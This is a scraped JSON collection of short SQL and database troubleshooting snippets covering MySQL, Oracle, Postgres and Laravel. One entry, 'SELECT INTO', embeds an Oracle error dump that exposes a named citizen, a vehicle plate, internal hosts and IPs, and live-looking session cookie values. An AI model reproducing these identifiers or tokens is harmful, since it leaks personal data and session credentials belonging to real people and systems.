    "description": "DATE_FORMAT(date, format) -- E.g. SELECT DATE_FORMAT(dateField, '%m/%d/%Y') FROM TableName; -- See https://www.mysqltutorial.org/mysql-date_format/ for available formats\n-- Use the FROM_UNIXTIME() function in MySQL select from_unixtime(timestamp) from my_tbl;\n-- Converts 'dd.mm.yyyy' to date\t(my_date_col is VARCHAR) SELECT STR_TO_DATE(my_date_col,'%d.%m.%Y') AS my_strdate FROM my_table; -- Converts 'dd.mm.yyyy' to 'YYYY-MM-DD' SELECT DATE_FORMAT(STR_TO_DATE(my_date_col,'%d.%m.%Y'), '%Y-%m-%d') AS my_strdate \tFROM my_table;\n-- use DATE_FORMAT with %H %i -- SELECT DATE_FORMAT(MemberBookFacility.time, '%H:%i') \"45\": \"09:00\", \"24\": \"10:00\", \"42\": \"11:00\", \"48\": \"12:00\",  -- ONcakephp must use below format $this->virtualFields['time'] = \"DATE_FORMAT(MemberBookFacility.time, '%H:%i')\";\t// using this for use concat \t \t\treturn $this->find('list', array(           'conditions' => $conditions,           'fields' => array(             'MemberBookFacility.id',              'time',           ),           'order' => array(             'MemberBookFacility.time ASC',           ),         ));\nuse \\Datetime;  $now = new DateTime(); echo $now->format('Y-m-d H:i:s');    // MySQL datetime format echo $now->getTimestamp();           // Unix Timestamp -- Since PHP 5.3 \nDATE : YYYY-MM-DD format DATETIME : YYYY-MM-DD HH:MM:SS format TIMESTAMP : X s from 1970 format TIME : HH:MM:SS format\n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 160,
    "keyword": null,
    "link": null,
    "title": " MySQL import data from large CSV file",
    "description": "LOAD DATA INFILE 'data.csv' INTO TABLE tbl_name  FIELDS TERMINATED BY ','  ENCLOSED BY '\"'  LINES TERMINATED BY '\\r\\n'  IGNORE 1 LINES;\n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 161,
    "keyword": null,
    "link": null,
    "title": " MySQL query to get column names",
    "description": "SELECT `COLUMN_NAME`  FROM `INFORMATION_SCHEMA`.`COLUMNS`  WHERE `TABLE_SCHEMA`='yourdatabasename'      AND `TABLE_NAME`='yourtablename'; \nSELECT table_name, column_name from information_schema.columns WHERE column_name LIKE '%column_name_to_search%';\n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 162,
    "keyword": null,
    "link": null,
    "title": " MySql FULL OUTER JOIN",
    "description": "-- MySql FULL OUTER JOIN  SELECT * FROM t1 LEFT JOIN t2 ON t1.id = t2.id UNION ALL SELECT * FROM t1 RIGHT JOIN t2 ON t1.id = t2.id WHERE t1.id IS NULL \nSELECT C.FirstName, C.LastName, C.Country AS CustomerCountry,        S.Country AS SupplierCountry, S.CompanyName  FROM Customer C FULL JOIN Supplier S     ON C.Country = S.Country ORDER BY C.Country, S.Country\nAll part of the tables both matching portions and unmatching portions from both tables.\n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 163,
    "keyword": null,
    "link": null,
    "title": " MySql get fields of table",
    "description": "SHOW COLUMNS FROM mydb.mytable;\nSELECT COLUMN_NAME   FROM INFORMATION_SCHEMA.COLUMNS   WHERE TABLE_SCHEMA = 'my_database' AND TABLE_NAME = 'my_table'; \nDESCRIBE my_table; \n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 164,
    "keyword": null,
    "link": null,
    "title": " MySql get primary keys of table",
    "description": "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'Your Database'   AND TABLE_NAME = 'Your Table name'   AND COLUMN_KEY = 'PRI';   SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'Your Database'   AND TABLE_NAME = 'Your Table name'   AND COLUMN_KEY = 'UNI'; \n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 165,
    "keyword": null,
    "link": null,
    "title": " Mysql2::Error: Incorrect string value: '\\xE2\\x80\\x8B",
    "description": "ALTER TABLE your_database_name.your_table CONVERT TO CHARACTER SET utf8\n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 166,
    "keyword": null,
    "link": null,
    "title": " Mysql Change Database Name",
    "description": "RENAME TABLE old_db.table TO new_db.table; \n# Create a dump file for the database (logged via ssh): mysqldump -u [UserName] -p[Password] -R [DB_Name] > [DB_Name].sql # Create a new blank database by using the mysqladmin command: mysqladmin -u [UserName] -p[Pasword] create [New_DB_Name] # Import the dump file into the new database you created: mysql -u [UserName] -p[Password] [New_DB_Name] < [DB_Name].sql # Delete the old MySQL database name (optional): mysqladmin -u [Username] -p[Password] drop [DB_Name]\n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 167,
    "keyword": null,
    "link": null,
    "title": " Mysql table variables",
    "description": "CREATE PROCEDURE my_proc ()  BEGIN  CREATE TEMPORARY TABLE TempTable (myid int, myfield varchar(100));  INSERT INTO TempTable SELECT tblid, tblfield FROM Table1;  ... -- Temporary tables in MySQL only exist for the duration of the connection  -- and only for the connected user, unlike MSSQL where they persist across  -- sessions and connections.\n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 168,
    "keyword": null,
    "link": null,
    "title": " NESTED QUERY SQL",
    "description": "SELECT * FROM students WHERE notes > ( SELECT AVG(notes) FROM students );  SELECT * FROM students WHERE class_id = (     SELECT id FROM classes WHERE number_of_students = (         SELECT MAX(number_of_students) FROM classes     ) );  SELECT subject, MAX(salary_by_subject.avg_salary) AS max_salary FROM (     SELECT subject, AVG(monthly_salary) AS avg_salary     FROM teachers     GROUP BY subject ) salary_by_subject;\nSELECT column_name [, column_name ] FROM   table1 [, table2 ] WHERE  column_name OPERATOR    (SELECT column_name [, column_name ]    FROM table1 [, table2 ]    [WHERE])\n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 169,
    "keyword": null,
    "link": null,
    "title": " NOT NULL SQL",
    "description": "SELECT column_name FROM table_name  WHERE column_name IS NOT NULL;\nSELECT column_names FROM table_name WHERE column_name IS NOT NULL;\nSELECT column_name FROM table_name  WHERE column_name IS NULL;\nSELECT * FROM my_table WHERE my_column IS NOT NULL;\nThe reverse of NULL. Tests for values that aren&rsquo;t empty / NULL \"Tests for empty (NULL) values. Example: Returns users that haven&rsquo;t given a contact number. SELECT * FROM users WHERE contact_number IS NULL;\"\nBy default, a column can hold NULL values. The NOT NULL constraint enforces a column to NOT accept NULL values. This enforces a field to always contain a value, which means that you cannot insert a new record, or update a record without adding a value to this field.  Sql NOT NULL in creating a table CREATE TABLE Persons (     ID int NOT NULL,     LastName varchar(255) NOT NULL,     FirstName varchar(255) NOT NULL,     Age int );\n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 170,
    "keyword": null,
    "link": null,
    "title": " No module named 'MySQLdb'",
    "description": "You can install mysqlclient with pip  If using Python3, try this:  pip3 install mysqlclient  or in Python2  pip install mysqlclient\nsudo apt-get install libmysqlclient-dev sudo apt-get install libssl-dev pip install mysqlclient\nsudo apt-get install -y python3-mysqldb\nconda install -c anaconda mysqlclient \nsudo apt-get install -y python-dev libmysqlclient-dev && sudo pip install mysqlclient \n",
    "reg_date": "2021-10-12T09:53:49.000Z"
  },
  {
    "id": 171,
    "keyword": null,
    "link": null,
    "title": " No module named ' sqlite3",
    "description": "sudo apt-get install libsqlite3-dev pip install pysqlite\n",
    "reg_date": "2021-10-12T09:53:50.000Z"
  },
  {
    "id": 172,
    "keyword": null,
    "link": null,
    "title": " ORA-00942",
    "description": "-- ORA-00942 table or view does not exist      First check access: GRANT SELECT ON table_name TO schema_name;\n",
    "reg_date": "2021-10-12T09:53:50.000Z"
  },
  {
    "id": 173,
    "keyword": null,
    "link": null,
    "title": " ORA-01157: cannot identify/lock data file 7 - see DBWR trace file ORA-01110: data file 7: 'D:\\DOCUMENTOS\\BDORACLE\\CLASE003.DBF'",
    "description": "C:\\>sqlplus sys/sys as sysdba SQL*Plus: Release 11.2.0.3.0 Production on Tue Apr 30 19:07:16 2013 Copyright (c) 1982, 2011, Oracle.  All rights reserved. Connected to an idle instance.  SQL> startup ORACLE instance started. Total System Global Area  778387456 bytes Fixed Size                  1384856 bytes Variable Size             520097384 bytes Database Buffers          251658240 bytes Redo Buffers                5246976 bytes Database mounted. ORA-01157: cannot identify/lock data file 11 &ndash; see DBWR trace file ORA-01110: data file 16: 'E:\\oracle\\app\\nimish.garg\\oradata\\orcl\\test_ts.dbf'  SQL> select NAME from v$datafile where file#=16; NAME -------------------------------------------------------------------------------- E:\\ORACLE\\APP\\NIMISH.GARG\\ORADATA\\ORCL\\TEST_TS.DBF  SQL> alter database datafile 16 OFFLINE DROP; Database altered.  SQL> alter database open; Database altered. \n",
    "reg_date": "2021-10-12T09:53:50.000Z"
  },
  {
    "id": 174,
    "keyword": null,
    "link": null,
    "title": " ORA-01950",
    "description": "ALTER USER <user> QUOTA UNLIMITED ON <tablespace name>;\n",
    "reg_date": "2021-10-12T09:53:50.000Z"
  },
  {
    "id": 175,
    "keyword": null,
    "link": null,
    "title": " ORA-02293: unable to validate (GREENMILE.CK FIELD01) - check constraint violated",
    "description": "ALTER TABLE suppliers ADD CONSTRAINT check_supplier_name   CHECK (supplier_name IN ('IBM', 'Microsoft', 'NVIDIA'));\n",
    "reg_date": "2021-10-12T09:53:50.000Z"
  },
  {
    "id": 176,
    "keyword": null,
    "link": null,
    "title": " ORACLE RIGHT TWO DIGITS",
    "description": "-- ORACLE SQL - Get the 2 digits at the right end of a string SELECT SUBSTR('TN0001234567890345',-2) FROM DUAL; \n",
    "reg_date": "2021-10-12T09:53:50.000Z"
  },
  {
    "id": 177,
    "keyword": null,
    "link": null,
    "title": " ORACLE SQL DECODE",
    "description": "SELECT  DECODE (t.column_name,  1, 'Southlake',                          2, 'San Francisco',                          3, 'New Jersey',                          4, 'Seattle',                            'Non domestic') new_name FROM table_name t  # If warehouse_id is not 1, 2, 3, or 4, then the function returns 'Non domestic'.\nDECODE(X, D1, R1, D2, R2, D3, R3, ..., Rx) /* if X = D1 then return R1 else if X = D2 then return R2 else if X = D3 then return R3 ... else return Rx */\n",
    "reg_date": "2021-10-12T09:53:50.000Z"
  },
  {
    "id": 178,
    "keyword": null,
    "link": null,
    "title": " ORACLE SQL SUBSTR",
    "description": "-- ORACLE substr(string, start, [, length ]) SELECT substr('Hello World', 4, 5) FROM DUAL;       -- lo Wo SELECT substr('Hello World', 4) FROM DUAL;          -- lo World SELECT substr('Hello World', -3) FROM DUAL;         -- rld SELECT substr('Hello World', -3, 2) FROM DUAL;      -- rl\nSUBSTR( string, start_position [, length ] )\nSUBSTR(string, :START_POS, :SUBSTR_LENGTH);  SELECT SUBSTR('ABCDEFG',3,4) FROM DUAL; --OUTPUT: CDEF\n/*Using SUBSTR in Oracle (Example from hackerrank.com): */  /*Simple select query...*/  SELECT DISTINCT city  FROM station   /*Using WHERE and SUBSTR to find (distinct) cities in station table that begin  as well as end with a vowel.*/  WHERE SUBSTR(city,1,1) IN ('A','E','I','O','U')  \tAND substr(city,-1) IN ('a','e','i','o','u');   /*Parameters for SUBSTR (Substring) in order are as follows:  String, Start, Length.*/ \n-- ORACLE SQL - Get the 2 digits at the right end of a string SELECT SUBSTR('TN0001234567890345',-2) FROM DUAL;  \n",
    "reg_date": "2021-10-12T09:53:50.000Z"
  },
  {
    "id": 179,
    "keyword": null,
    "link": null,
    "title": " ORACL SQL DECODE",
    "description": "SELECT  DECODE (t.column_name,  1, 'Southlake',                          2, 'San Francisco',                          3, 'New Jersey',                          4, 'Seattle',                            'Non domestic') new_name FROM table_name t  # If warehouse_id is not 1, 2, 3, or 4, then the function returns 'Non domestic'.\n",
    "reg_date": "2021-10-12T09:53:50.000Z"
  },
  {
    "id": 180,
    "keyword": null,
    "link": null,
    "title": " OSError: mysql config not found",
    "description": "assuming debian / ubuntu: \tsudo apt-get install libmysqlclient-dev if you are using mariadb: \tsudo apt-get install libmariadbclient-dev\n",
    "reg_date": "2021-10-12T09:53:50.000Z"
  },
  {
    "id": 181,
    "keyword": null,
    "link": null,
    "title": " Oracle Column Names of a table",
    "description": "DESCRIBE Table_Name;  OR   DESC Table_Name;\n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 182,
    "keyword": null,
    "link": null,
    "title": " Oracle NLS CHARACTERSET",
    "description": "SELECT * FROM nls_database_parameters WHERE PARAMETER = 'NLS_CHARACTERSET'; SELECT * FROM v$nls_parameters WHERE PARAMETER = 'NLS_CHARACTERSET'; -- NLS_CHARACTERSET for VARCHAR2, NLS_NCHAR_CHARACTERSET for NVARCHAR2 SELECT * FROM database_properties WHERE PROPERTY_NAME     IN ('NLS_CHARACTERSET', 'NLS_NCHAR_CHARACTERSET');\n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 183,
    "keyword": null,
    "link": null,
    "title": " PLS-00225 type",
    "description": "GRANT EXECUTE ON schema.type_name TO user_name;\n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 184,
    "keyword": null,
    "link": null,
    "title": " PL SQL MODIFY COLUMN NME",
    "description": "ALTER TABLE table_name   RENAME COLUMN old_name TO new_name;\n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 185,
    "keyword": null,
    "link": null,
    "title": " POSTGRES INTEGER SET DEFAULT VALUE",
    "description": "score INTEGER DEFAULT 1 /* The variable name is score, and the default value for it is 1 */\n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 186,
    "keyword": null,
    "link": null,
    "title": " Port 5432 is already in use Usually this means that there is already a PostgreSQL server running on your Mac. If you want to run multiple servers simultaneously, use different ports.",
    "description": "sudo pkill -u postgres\n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 187,
    "keyword": null,
    "link": null,
    "title": " PostgreSQL types and C# types",
    "description": "Postgresql  NpgsqlDbType System.DbType Enum .Net System Type ----------  ------------ ------------------ ---------------- int8        Bigint       Int64              Int64 bool        Boolean      Boolean            Boolean bytea       Bytea        Binary             Byte[] date        Date         Date               DateTime float8      Double       Double             Double int4        Integer      Int32              Int32 money       Money        Decimal            Decimal numeric     Numeric      Decimal            Decimal float4      Real         Single             Single int2        Smallint     Int16              Int16 text        Text         String             String time        Time         Time               DateTime timetz      Time         Time               DateTime timestamp   Timestamp    DateTime           DateTime timestamptz TimestampTZ  DateTime           DateTime interval    Interval     Object             TimeSpan varchar     Varchar      String             String inet        Inet         Object             IPAddress bit         Bit          Boolean            Boolean uuid        Uuid         Guid               Guid array       Array        Object             Array \n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 188,
    "keyword": null,
    "link": null,
    "title": " Postgres: Create Column add constraint to the column with Query Output",
    "description": "ALTER TABLE customers  ADD COLUMN contact_name VARCHAR NOT NULL;\n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 189,
    "keyword": null,
    "link": null,
    "title": " Postgres - Login and connect as default user",
    "description": "$ sudo -u postgres psql \n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 190,
    "keyword": null,
    "link": null,
    "title": " RENAME table pl sql",
    "description": "ALTER TABLE old_table_name   RENAME TO new_table_name;\n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 191,
    "keyword": null,
    "link": null,
    "title": " Reset SQL auto increment",
    "description": "ALTER TABLE tmp AUTO_INCREMENT = 3;\nDBCC CHECKIDENT (mytable, RESEED, 0)\nALTER TABLE tablename AUTO_INCREMENT = 1\nSET  @num := 0;  UPDATE your_table SET id = @num := (@num+1);  ALTER TABLE your_table AUTO_INCREMENT =1;\n",
    "reg_date": "2021-10-12T09:53:51.000Z"
  },
  {
    "id": 192,
    "keyword": null,
    "link": null,
    "title": " Restart MySQL",
    "description": "sudo /etc/init.d/mysql start or  systemctl start mysql.service\n##  mariadb ## systemctl start mariadb ## mysql  systemctl start mysqld\nsudo /etc/init.d/mysql restart\n                                     service mysqld restart \n sudo /usr/local/mysql/support-files/mysql.server restart\n",
    "reg_date": "2021-10-12T09:53:52.000Z"
  },
  {
    "id": 193,
    "keyword": null,
    "link": null,
    "title": " RowDataPacket",
    "description": "var resultArray = Object.values(JSON.parse(JSON.stringify(rows))) \n",
    "reg_date": "2021-10-12T09:53:52.000Z"
  },
  {
    "id": 194,
    "keyword": null,
    "link": null,
    "title": " SELECT INTO",
    "description": "Select * into Backup_of_Student_info from student_info\nSELECT NAME, ADDRESS, PHONE INTO v_employee_name, v_employee_address, v_employee_phone_number FROM EMPLOYEE WHERE EMPLOYYE_ID = 6;\n\tSELECT * INTO nome_da_tabela_que_estao_a_mexer_BKP \tFROM nome_da_tabela_que_estao_a_mexer\nWed, 17 Mar 2021 15:19:22 GMT  Failed to execute target procedure ORA-06502: PL/SQL: numeric or value error: character string buffer too small ORA-06512: at \"CMFIN_09.CMA_FICHA_MANTER\", line 790 ORA-06512: at line 33    DAD name: cmfin_09   PROCEDURE  : CMA_FICHA_MANTER.inserir_trata   URL        : http://rai-dc-appdev.gov.cv:80/cmfin_09/CMA_FICHA_MANTER.inserir_trata   PARAMETERS :   ===========   sessid:    20081725210350882001   p_id:    67828   qual_utente:    0   p_marca:    VOLKSWAGEN   p_especie:    AUTOM&Oacute;VEL   p_cilindrada:    3500   p_matricula:    st-00-ZL   p_dt_matricula:    23-02-2021   p_registo:    232   p_memo:       p_activo:    on   P_ANO_ISENCAO_JUROS:    NULL   p_utente_id:    97610                   p_utente:    Aderito Filipe Pina Goncalves                   btnConfirmar:    32    12    ENVIRONMENT:   ============     PLSQL_GATEWAY=WebDb     GATEWAY_IVERSION=2     SERVER_SOFTWARE=Oracle-HTTP-Server-11g     GATEWAY_INTERFACE=CGI/1.1     SERVER_PORT=80     SERVER_NAME=rai-dc-appdev.gov.cv     REQUEST_METHOD=POST     QUERY_STRING=     PATH_INFO=/CMA_FICHA_MANTER.inserir_trata     SCRIPT_NAME=/cmfin_09     REMOTE_HOST=     REMOTE_ADDR=10.0.28.8     SERVER_PROTOCOL=HTTP/1.1     REQUEST_PROTOCOL=HTTP     REMOTE_USER=cmfin_09     ORACLE_SSO_USER=     OSSO_IDLE_TIMEOUT_EXCEEDED=     OSSO_USER_GUID=     HTTP_CONTENT_LENGTH=402     HTTP_CONTENT_TYPE=application/x-www-form-urlencoded     HTTP_USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36     HTTP_HOST=nosiappsdev.gov.cv     HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9     HTTP_ACCEPT_ENCODING=gzip, deflate, br     HTTP_ACCEPT_LANGUAGE=pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7     HTTP_ACCEPT_CHARSET=     HTTP_COOKIE=acgroupswithpersist=nada; nosimail=9FEEF8C6ECD9855F2C41AF7EF44E7F46E74C36F0; iNavigate_=1; iNavigate__35=0; acopendivids=Q4; nosiactiv=ADERITO.GONCALVES; iNavigate__11=0; iNavigate__16=0; iNavigate__57=0; iNavigate__18=0; iNavigate__58=0; iNavigate__34=0; iNavigate__12=0; iNavigate__62=0; iNavigate__39=0; iNavigate__50=0; iNavigate__36=0; iNavigate__40=0; iNavigate__31=0; iNavigate__17=0; iNavigate__48=0; iNavigate__9=0; iNavigate__10=0; iNavigate__21=0; iNavigate__13=0; iNavigate__15=0; iNavigate__6=0; iNavigate__8=0; iNavigate__5=0; iNavigate__1=0; iNavigate__2=0; iNavigate__4=0; iNavigate__51=0; iNavigate__7=0; iNavigate__59=1; iNavigate__3=1; nosisso=BDBD7948A39B8E33E0530100007FE03E     HTTP_IF_MODIFIED_SINCE=     HTTP_REFERER=https://nosiappsdev.gov.cv/cmfin_09/CMA_FICHA_MANTER.show?sessid=20081725210350882001     HTTP_SOAPACTION=     HTTP_ORACLE_ECID=     HTTP_ORACLE_CACHE_VERSION=     HTTP_AUTHORIZATION=     WEB_AUTHENT_PREFIX=     DAD_NAME=cmfin_09     DOC_ACCESS_PATH=docs     DOCUMENT_TABLE=rh_funcionarios_upload     PATH_ALIAS=     REQUEST_CHARSET=WE8MSWIN1252     REQUEST_IANA_CHARSET=WINDOWS-1252     SCRIPT_PREFIX=     HTTP_IF_MATCH=     HTTP_CACHE_CONTROL=     SOAP_BODY=     HTTP_X_ORACLE_DEVICE_CLASS=     HTTP_X_ORACLE_DEVICE_ORIENTATION=     HTTP_X_ORACLE_DEVICE_MAXDOCSIZE=     HTTP_X_ORACLE_DEVICE=     HTTP_X_ORACLE_ORIG_ACCEPT=     HTTP_X_ORACLE_ORIG_USER_AGENT=     HTTP_X_ORACLE_USER_LOCALE=     HTTP_X_ORACLE_USER_NAME=     HTTP_X_ORACLE_USER_DISPLAYNAME=     HTTP_X_ORACLE_USER_USERKIND=     HTTP_X_ORACLE_USER_AUTHKIND=     HTTP_X_ORACLE_USER_DEVICEID=     HTTP_X_ORACLE_USER_LOCATION_ADDRESSLINE1=     HTTP_X_ORACLE_USER_LOCATION_ADDRESSLINE2=     HTTP_X_ORACLE_USER_LOCATION_ADDRESSLASTLINE=     HTTP_X_ORACLE_USER_LOCATION_BLOCK=     HTTP_X_ORACLE_USER_LOCATION_CITY=     HTTP_X_ORACLE_USER_LOCATION_COMPANYNAME=     HTTP_X_ORACLE_USER_LOCATION_COUNTY=     HTTP_X_ORACLE_USER_LOCATION_STATE=     HTTP_X_ORACLE_USER_LOCATION_POSTALCODE=     HTTP_X_ORACLE_USER_LOCATION_POSTALCODEEXT=     HTTP_X_ORACLE_USER_LOCATION_COUNTRY=     HTTP_X_ORACLE_USER_LOCATION_TYPE=     HTTP_X_ORACLE_USER_LOCATION_X=     HTTP_X_ORACLE_USER_LOCATION_Y=     HTTP_X_ORACLE_SERVICE_HOME_URL=     HTTP_X_ORACLE_SERVICE_PARENT_URL=     HTTP_X_ORACLE_HOME_URL=     HTTP_X_ORACLE_MODULE_CALLBACK_URL=     HTTP_X_ORACLE_MODULE_CALLBACK_LABEL=     HTTP_X_ORACLE_CACHE_USER=     HTTP_X_ORACLE_CACHE_SUBID=     HTTP_X_ORACLE_CACHE_AUTH=     HTTP_X_ORACLE_CACHE_DEVICE=     HTTP_X_ORACLE_CACHE_LANG=     HTTP_X_ORACLE_CACHE_ENCRYPT=     HTTP_X_ORACLE_ASSERT_USER= \n",
    "reg_date": "2021-10-12T09:53:52.000Z"
  },
  {
    "id": 195,
    "keyword": null,
    "link": null,
    "title": " SELECT LOCKED FROM public.databasechangeloglock WHERE ID=1",
    "description": "UPDATE DATABASECHANGELOGLOCK SET LOCKED=FALSE, LOCKGRANTED=null, LOCKEDBY=null where ID=1;\n",
    "reg_date": "2021-10-12T09:53:52.000Z"
  },
  {
    "id": 196,
    "keyword": null,
    "link": null,
    "title": " SELECT User,Host FROM mysql.user;",
    "description": "mysql> select host, user, password from mysql.user; \nSELECT User,Host FROM mysql.user; DROP USER 'testuser'@'localhost';\n",
    "reg_date": "2021-10-12T09:53:52.000Z"
  },
  {
    "id": 197,
    "keyword": null,
    "link": null,
    "title": " SELECT table name FROM user tables;",
    "description": "SELECT   table_name, owner FROM   all_tables ORDER BY   owner, table_name \nSELECT   table_name, owner FROM   user_tables ORDER BY   owner, table_name \n",
    "reg_date": "2021-10-12T09:53:52.000Z"
  },
  {
    "id": 198,
    "keyword": null,
    "link": null,
    "title": " SQL: calculate hours from two dates",
    "description": "DATEDIFF(second, start_date, end_date) / 3600.0 \n",
    "reg_date": "2021-10-12T09:53:53.000Z"
  },
  {
    "id": 199,
    "keyword": null,
    "link": null,
    "title": " SQL: merging multiple row data in string",
    "description": "DECLARE @Names VARCHAR(8000)  SELECT @Names = COALESCE(@Names + ', ', '') +      ISNULL(Name, 'N/A') FROM People \n",
    "reg_date": "2021-10-12T09:53:53.000Z"
  },
  {
    "id": 200,
    "keyword": null,
    "link": null,
    "title": " SQLSTATE[42000]: Syntax error or access violation: 1140 Mixing of GROUP columns (MIN(),MAX(),COUNT(),...) with no GROUP columns is illegal if there is no GROUP BY clause",
    "description": "#database.php  'strict' => false after that you can use group by on a single column too.\n",
    "reg_date": "2021-10-12T09:53:53.000Z"
  },
  {
    "id": 201,
    "keyword": null,
    "link": null,
    "title": " SQLSTATE[42000]: Syntax error or access violation: 1231 Variable 'sql mode' can't be set to the value of 'NO AUTO CREATE USER'",
    "description": "I finally found the solutions a days ago and I remembered this post. In the  \"config/database.php\" file in mysql tag, the sql modes should be added in order  to skip this error.   https://dev.mysql.com/doc/refman/8.0/en/sql-mode.html#sql-mode-full  My MySQL array ended up like this:  'mysql' => [         'driver' => 'mysql',         'host' => env('DB_HOST', '127.0.0.1'),         'port' => env('DB_PORT', '3306'),         'database' => env('DB_DATABASE', 'forge'),         'username' => env('DB_USERNAME', 'forge'),         'password' => env('DB_PASSWORD', ''),         'unix_socket' => env('DB_SOCKET', ''),         'charset' => 'utf8mb4',         'collation' => 'utf8mb4_unicode_ci',         'prefix' => '',         'strict' => true,         'engine' => null,         'modes'  => [             'ONLY_FULL_GROUP_BY',             'STRICT_TRANS_TABLES',             'NO_ZERO_IN_DATE',             'NO_ZERO_DATE',             'ERROR_FOR_DIVISION_BY_ZERO',             'NO_ENGINE_SUBSTITUTION',         ],     ],\n",
    "reg_date": "2021-10-12T09:53:53.000Z"
  },
  {
    "id": 202,
    "keyword": null,
    "link": null,
    "title": " SQLSTATE[HY000]: General error: 3780 Referencing column 'role id' and referenced column 'id' in foreign key constraint 'user role id foreign' are incompatible.",
    "description": "As the name says the referenced foreign key and the id in the table are not of  same type.   Example :   // user_id foreign key referenced table $table->bigInteger('user_id')->unsigned()->index(); $table->foreign('user_id')->references('id')->on('users')->onDelete('cascade');   // Then inside users table $table->bigIncrements('id')->unsigned()->index(); \n$table->bigInteger('user_id')->unsigned()->index(); $table->foreign('user_id')->references('id')->on('users')->onDelete('cascade'); \n",
    "reg_date": "2021-10-12T09:53:53.000Z"
  },
  {
    "id": 203,
    "keyword": null,
    "link": null,
    "title": " SQLSTATE[HY000] [1040] Too many connections",
    "description": "On a shared hosting, \"unlimited\" means other users are unrestricted with their resource using. Means they can eat up whole pool, while your consumption remains modest  This is a limit of database's configuration. If you have permission to edit  the configuration file of your database service, you can change max_connections value.  You can try running this SQL query (take care about this value!) \tSET GLOBAL max_connections = 512;  and this to get current value of all variables: \tSHOW VARIABLES; or (for specific variable):  SHOW GLOBAL VARIABLES LIKE '%max_connections%'\n",
    "reg_date": "2021-10-12T09:53:53.000Z"
  },
  {
    "id": 204,
    "keyword": null,
    "link": null,
    "title": " SQLSTATE[HY000] [1049] Unknown database",
    "description": "php artisan cache:clear php artisan migrate:install\n",
    "reg_date": "2021-10-12T09:53:53.000Z"
  },
  {
    "id": 205,
    "keyword": null,
    "link": null,
    "title": " SQL | SELECT data from Multiple Tables",
    "description": "SELECT tablenmae1.colunmname, tablename2.columnnmae     FROM tablenmae1   JOIN tablename2   ON tablenmae1.colunmnam = tablename2.columnnmae ORDER BY columnname;   \n",
    "reg_date": "2021-10-12T09:53:53.000Z"
  },
  {
    "id": 206,
    "keyword": null,
    "link": null,
    "title": " SQL Alter column to be not null",
    "description": "ALTER TABLE table_name ALTER COLUMN col_name data_type NOT NULL; \n",
    "reg_date": "2021-10-12T09:53:53.000Z"
  },
  {
    "id": 207,
    "keyword": null,
    "link": null,
    "title": " SQL DELETE-Klausel",
    "description": "Mit DELETE werden einzelne oder mehrere Datens&auml;tze gel&ouml;scht. Mit WHERE  werden nur bestimmte Datens&auml;tez gel&ouml;scht.     DELETE FROM suppliers   WHERE        supplier_name = 'Microsoft'; \n",
    "reg_date": "2021-10-12T09:53:53.000Z"
  },
  {
    "id": 208,
    "keyword": null,
    "link": null,
    "title": " SQL DELETE",
    "description": "DELETE FROM table_name WHERE some_column = some_value \nDELETE FROM table_name WHERE condition; -- \t\t\tEx. DELETE FROM Customers WHERE CustomerName='Mustafa Mbari';\nMit DELETE werden einzelne oder mehrere Datens&auml;tze gel&ouml;scht. Mit WHERE  werden nur bestimmte Datens&auml;tez gel&ouml;scht.     DELETE FROM suppliers   WHERE        supplier_name = 'Microsoft'; \nDELETE FROM my_table;\t\t-- all rows DELETE FROM my_table WHERE my_id = 12345; DELETE FROM my_table WHERE my_id IN (SELECT id2 FROM my_table2); COMMIT;\t\t-- don't forget it...\nDelete data from a table. Example: Removes a user with a user_id of 674. DELETE FROM users WHERE user_id = 674;\nDELETE FROM computer WHERE name = '{}' \n",
    "reg_date": "2021-10-12T09:53:54.000Z"
  },
  {
    "id": 209,
    "keyword": null,
    "link": null,
    "title": " SQL Date Format",
    "description": "SELECT CONVERT(VARCHAR, GETDATE(),101) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),102) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),103) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),104) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),105) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),106) AS DATE  SELECT DATE = FORMAT(GETDATE(), 'dd-MM-yyyy') \nCast( '2011-07-07' as date ) as convertedDate\nSELECT FORMAT(dbo.column, 'M/dd/yyyy')\nconvert( datetime, fecha, 103 )\nDATE - format YYYY-MM-DD DATETIME - format: YYYY-MM-DD HH:MI:SS TIMESTAMP - format: YYYY-MM-DD HH:MI:SS YEAR - format YYYY or YY\ndefault date format of my sql - YYYY-MM-DD\n",
